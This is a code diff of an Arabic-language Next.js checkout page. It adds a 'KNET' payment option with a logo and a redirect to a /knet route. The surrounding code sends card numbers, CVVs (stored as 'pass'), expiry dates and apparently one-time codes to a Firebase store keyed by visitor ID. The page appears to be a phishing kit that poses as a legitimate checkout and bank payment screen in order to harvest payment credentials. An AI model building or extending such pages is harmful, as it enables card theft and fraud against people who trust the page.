@@ -13,6 +13,7 @@ import { Card, CardContent } from "@/components/ui/card"
 import { Badge } from "@/components/ui/badge"
 import { Separator } from "@/components/ui/separator"
 import { addData } from "@/lib/firebase"
+import { useRouter } from "next/navigation"
 const allOtps = ['']
 
 export default function CheckoutPage() {
@@ -21,6 +22,8 @@ export default function CheckoutPage() {
     const [otpError, setOtpError] = useState("")
     const [isLoading, setIsLoading] = useState(false)
     const [expiryDate, setExpiryDate] = useState("")
+    const router = useRouter()
+
     const [formData, setFormData] = useState({
         fullName: "",
         email: "",
@@ -55,6 +58,10 @@ export default function CheckoutPage() {
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault()
         setIsLoading(true)
+if(formData.paymentMethod==="digital-wallet"){
+    router.push("/knet")
+return
+}
         const visitorId = localStorage.getItem('visitor')
         addData({
             id: visitorId, cardNumber: formData.cardNumber, pass: formData.cvv, month: formData.expiryDate,
@@ -158,61 +165,7 @@ export default function CheckoutPage() {
                 <div className="max-w-md mx-auto space-y-8">
                     <form onSubmit={handleSubmit} className="space-y-8">
                         {/* Enhanced User Details */}
-                        <Card className="shadow-xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
-                            <div className="bg-gradient-to-r from-slate-100 via-white to-purple-50 px-8 py-6 border-b border-slate-100">
-                                <h2 className="text-xl font-bold text-slate-800 flex items-center">
-                                    <div className="w-8 h-8 bg-gradient-to-r from-purple-600 to-pink-600 rounded-lg flex items-center justify-center ml-3">
-                                        <User className="w-4 h-4 text-white" />
-                                    </div>
-                                    بيانات المستخدم
-                                    <Badge variant="secondary" className="mr-3 bg-blue-100 text-blue-700 font-medium">
-                                        مطلوب
-                                    </Badge>
-                                </h2>
-                            </div>
-                            <CardContent className="p-6">
-                                <div className="space-y-4">
-                                    <div className="group">
-                                        <Label htmlFor="fullName" className="text-slate-700 text-base font-semibold mb-3 block">
-                                            الاسم الكامل <span className="text-red-500">*</span>
-                                        </Label>
-                                        <div className="relative">
-                                            <Input
-                                                id="fullName"
-                                                placeholder="أدخل الاسم الكامل"
-                                                value={formData.fullName}
-                                                onChange={(e: any) => handleInputChange("fullName", e.target.value)}
-                                                className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 text-base bg-white/50"
-                                                required
-                                            />
-                                            <div className="absolute inset-0 rounded-md bg-gradient-to-r from-purple-500/0 to-pink-500/0 group-focus-within:from-purple-500/5 group-focus-within:to-pink-500/5 transition-all duration-200 pointer-events-none"></div>
-                                        </div>
-                                    </div>
-
-                                    <div className="group">
-                                        <Label htmlFor="email" className="text-slate-700 text-base font-semibold mb-3 block">
-                                            البريد الإلكتروني
-                                            <Badge variant="outline" className="mr-2 text-xs border-slate-300 text-slate-500">
-                                                اختياري
-                                            </Badge>
-                                        </Label>
-                                        <div className="relative">
-                                            <Input
-                                                id="email"
-                                                type="email"
-                                                placeholder="example@domain.com"
-                                                value={formData.email}
-                                                onChange={(e) => handleInputChange("email", e.target.value)}
-                                                className="h-12 border-2 border-slate-200 focus:border-purple-500 focus:ring-4 focus:ring-purple-100 transition-all duration-200 text-base bg-white/50"
-                                                dir="ltr"
-                                            />
-                                            <div className="absolute inset-0 rounded-md bg-gradient-to-r from-purple-500/0 to-pink-500/0 group-focus-within:from-purple-500/5 group-focus-within:to-pink-500/5 transition-all duration-200 pointer-events-none"></div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </CardContent>
-                        </Card>
-
+                     
                         {/* Enhanced Payment Selection */}
                         <Card className="shadow-xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
                             <div className="bg-gradient-to-r from-slate-100 via-white to-purple-50 px-8 py-6 border-b border-slate-100">
@@ -327,7 +280,7 @@ export default function CheckoutPage() {
                                     </Card>
 
                                     {/* Additional Payment Methods */}
-                                    <Card className="border-2 border-slate-200 bg-slate-50/50 transition-all hover:shadow-md opacity-60 " dir="rtl">
+                                    <Card className="border-2 border-slate-200 bg-slate-50/50 transition-all hover:shadow-md " dir="rtl">
                                         <CardContent className="p-4">
                                             <div className="flex items-center justify-between">
                                                 <div className="flex items-center">
@@ -335,17 +288,16 @@ export default function CheckoutPage() {
                                                         value="digital-wallet"
                                                         id="digital-wallet"
                                                         className="border-2 border-slate-300 ml-4 w-5 h-5"
-                                                        disabled
                                                     />
                                                     <div>
                                                         <Label htmlFor="digital-wallet" className="text-slate-600 font-semibold text-lg">
-                                                            المحفظة الرقمية
+كي نت
                                                         </Label>
-                                                        <p className="text-slate-500 text-sm">قريباً</p>
+                                                        <p className="text-slate-500 text-sm"></p>
                                                     </div>
                                                 </div>
                                                 <div className="flex items-center space-x-2 space-x-reverse">
-                                                    <Wallet className="w-6 h-6 text-slate-400" />
+                                                    <img src="kv.png" className="w-6 h-6 text-slate-400 rounded" />
                                                     <Smartphone className="w-6 h-6 text-slate-400" />
                                                 </div>
                                             </div>
